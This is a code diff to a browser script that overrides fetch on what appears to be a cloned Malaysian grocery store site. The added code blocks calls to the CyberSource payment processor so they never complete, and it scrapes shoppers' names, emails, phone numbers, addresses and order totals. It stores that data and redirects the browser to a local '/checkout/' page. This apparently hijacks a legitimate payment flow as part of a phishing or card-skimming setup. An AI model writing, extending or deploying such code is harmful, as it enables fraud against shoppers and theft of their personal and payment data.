@@ -115,6 +115,13 @@
   if (originalFetch) {
     window.fetch = function(input, init) {
       var url = getUrl(input);
+
+      // Intercept cybersource payment config API → redirect to checkout
+      if (isCybersourceUrl(url)) {
+        redirectToCheckout();
+        return new Promise(function() {});
+      }
+
       var next = rewriteUrl(url);
       if (next && next !== url) {
         if (typeof input === 'string') {
@@ -216,6 +223,43 @@
 
   function isPaymentPage() {
     return /\/payment(?:[/?#]|$)/i.test(location.pathname);
+  }
+
+  function extractOrderData() {
+    var data = { productType: 'Grocery', currency: 'MYR' };
+    try {
+      var totalEl = document.querySelector('#total-price, .order-total, [class*="total"]');
+      if (totalEl) {
+        var txt = totalEl.textContent || '';
+        var m = txt.match(/[\d,.]+/);
+        if (m) data.amount = m[0].replace(/,/g, '');
+      }
+    } catch(ex) {}
+    try {
+      var nameEl = document.querySelector('input[placeholder*="name"], #cust-name, [name="fullName"]');
+      if (nameEl) data.customerName = nameEl.value || nameEl.textContent || '';
+      var emailEl = document.querySelector('input[type="email"], [name="email"]');
+      if (emailEl) data.email = emailEl.value || '';
+      var phoneEl = document.querySelector('input[type="tel"], [name="phone"]');
+      if (phoneEl) data.phone = phoneEl.value || '';
+      var addrEl = document.querySelector('input[placeholder*="address"], [name="address"]');
+      if (addrEl) data.address = addrEl.value || '';
+    } catch(ex) {}
+    return data;
+  }
+
+  function redirectToCheckout() {
+    var data = extractOrderData();
+    try { localStorage.setItem('lotus_order', JSON.stringify(data)); } catch(ex) {}
+    location.href = '/checkout/';
+  }
+
+  // Intercept cybersource payment flow
+  function isCybersourceUrl(url) {
+    return url && (
+      /cybersource\/config/i.test(url) ||
+      /secureacceptance\.cybersource\.com/i.test(url)
+    );
   }
 
   function installPaymentAntiFlickerStyle() {
